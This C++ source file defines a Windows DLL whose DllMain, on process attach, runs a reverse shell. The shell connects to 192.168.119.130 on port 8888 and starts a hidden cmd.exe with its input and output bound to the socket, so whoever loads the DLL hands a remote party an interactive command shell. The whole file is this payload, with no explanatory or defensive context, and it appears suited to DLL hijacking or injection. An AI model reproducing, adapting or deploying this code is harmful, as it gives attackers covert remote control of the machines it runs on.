// testdll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"

#include <winsock2.h>  
#include <stdlib.h>

#pragma comment(lib,"ws2_32")
void reverse_shell();
WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;



BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{


        switch (dwReason)
        {
        case DLL_PROCESS_ATTACH:
                reverse_shell();
                break;

        case DLL_PROCESS_DETACH:

                break;

        case DLL_THREAD_ATTACH:

                break;

        case DLL_THREAD_DETACH:

                break;
        }
        return TRUE;
}



void reverse_shell()
{
        LPCSTR szMyUniqueNamedEvent = "sysnullevt";
        HANDLE m_hEvent = CreateEventA(NULL, TRUE, FALSE, szMyUniqueNamedEvent);

        switch (GetLastError())
        {
                // app is already running
        case ERROR_ALREADY_EXISTS:
        {
                                                                 CloseHandle(m_hEvent);
                                                                 break;
        }

        case ERROR_SUCCESS:
        {

                                                  break;
        }
        }


        WSAStartup(MAKEWORD(2, 2), &wsaData);
        Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

        hax.sin_family = AF_INET;
        hax.sin_port = htons(atoi("8888"));

        hax.sin_addr.s_addr = inet_addr("192.168.119.130");
        WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

        memset(&ini_processo, 0, sizeof(ini_processo));
        ini_processo.cb = sizeof(ini_processo);
        ini_processo.dwFlags = STARTF_USESTDHANDLES;
        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

        CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&ini_processo, &processo_info);



}
